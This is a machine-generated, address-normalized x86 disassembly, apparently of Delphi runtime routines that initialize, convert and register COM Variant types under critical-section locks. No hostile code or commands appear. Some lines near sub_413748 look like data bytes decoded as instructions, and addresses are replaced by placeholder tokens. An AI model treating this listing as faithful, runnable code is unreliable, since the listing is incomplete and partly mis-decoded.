mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412696
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412679
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ea14
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404828
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412680
lea eax [ ebp - 0x10 ]
call sub_40edb8
retn
sub_4126a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4126fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f0e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4127d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412701
lea eax [ ebp - 0x10 ]
call sub_40edb8
retn
sub_412708
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4127c0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4139fc
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4127c7
lea eax [ ebp - 0x20 ]
call sub_404718
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4127a3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404828
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40edb8
retn
sub_4127d0
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412d22
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41280a ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404864
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404718
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404864
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404864
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409644
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404864
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409644
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404864
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411dc0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404754
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411df8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404754
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404828
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404914
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_411e30
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404754
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404864
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404864
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_4081d4
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4082c0
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404864
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_4082c0
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4127d0
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4125ec
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404754
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d29
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404730
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_40405c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404730
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_40405c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404730
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_40405c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404730
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4126a4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404754
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404864
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e5d4
test ah 0x40
je r-xdata
mov eax esi
call sub_404718
mov edx eax
mov eax ebx
call sub_412708
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4125ec
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404754
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4125ec
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404754
jmp r-xdata
jmp [ eax * 4 + jump_table_412a91 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404864
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409644
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409644
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411dc0
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404754
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411df8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404754
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404828
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411e30
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404754
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404864
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404864
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_4081d4
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_4082c0
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_4082c0
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404864
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4127d0
jmp r-xdata
sub_412d30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412d9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f0e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412da1
lea eax [ ebp - 0x10 ]
call sub_40edb8
retn
mov dx 0xd
mov ax 0x101
call sub_40e5d4
sub_412da8
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_412d30
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405940
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405940
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405928
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4139fc
test al al
je r-xdata
mov eax esi
call sub_405928
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e5d4
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e5d4
mov eax esi
call sub_405928
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_40339c
test al al
jne r-xdata
sub_412e74
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405928
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405928
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e5d4
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405940
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405940
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4139fc
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e5d4
mov eax esi
call sub_405928
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_40339c
test al al
jne r-xdata
sub_412f20
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ed3c
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_412f5c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_412f7c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ed3c
sub_412f9c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_412fbc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_412fdc
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ed3c
sub_412ffc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_41301c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed3c
sub_413048
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40ed3c
sub_41306c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed3c
sub_413098
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed3c
sub_4130c4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed3c
sub_4130f0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ed3c
sub_413154
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_413180
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404914
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_4131b8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405940
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_4131e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405940
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed3c
sub_413210
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413253
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404864
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41325a
lea eax [ ebp - 0x4 ]
call sub_404718
retn
sub_413260
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4132b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f0e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f0e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132bd
lea eax [ ebp - 0x10 ]
call sub_40edb8
retn
sub_4132cc
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ ebx ] 0x400c
jne r-xdata
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4132cc
jmp r-xdata
mov di [ ebx ]
movzx eax di
cmp eax 0x14
jg r-xdata
mov eax esi
call sub_40ed3c
pop edx
pop edi
pop esi
pop ebx
retn
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_413210
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax esi
call sub_413260
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f3ac
jmp r-xdata
je r-xdata
test di 0x2000
je r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40f3ac
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
test [ ebx + 0xb ] 0x80
je r-xdata
jmp r-xdata
mov eax edi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov ecx sub_4132c4
mov edx ebx
mov eax esi
call sub_40ee60
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f3ac
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40f3ac
jmp r-xdata
mov edx esp
mov eax edi
call sub_4139fc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f0e0
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f3ac
jmp r-xdata
jmp r-xdata
call sub_40e580
mov ecx ebx
mov edx esi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub_4135a0
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4136c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_40408c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4139fc
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404344
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_4082e8
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404344
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403238
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402904
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40429c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136cd
lea eax [ ebp - 0x208 ]
call sub_404038
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404344
sub_413748
call [ eax + 0x56080040 ]
popad
jb r-xdata
add bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4139fc
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_41397c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_413758
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4137b9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_4050b4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4137c0
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4032e8
sub_413808
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41397c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4139fc
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41385c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413894
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41397c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4138d0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403674
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_413933
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41393a
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4139d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4139fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_413aa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4050b4
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_413ab4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413b8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_413b6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4050bc
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b74
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403238
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40429c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407fd4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_413ba4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_413c13
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c1a
retn
call sub_413758
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_40527c
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_40edcc
sub_413c1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_413cbd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413cc4
retn
mov eax rw-data
call sub_413728
mov eax sub_40eacc
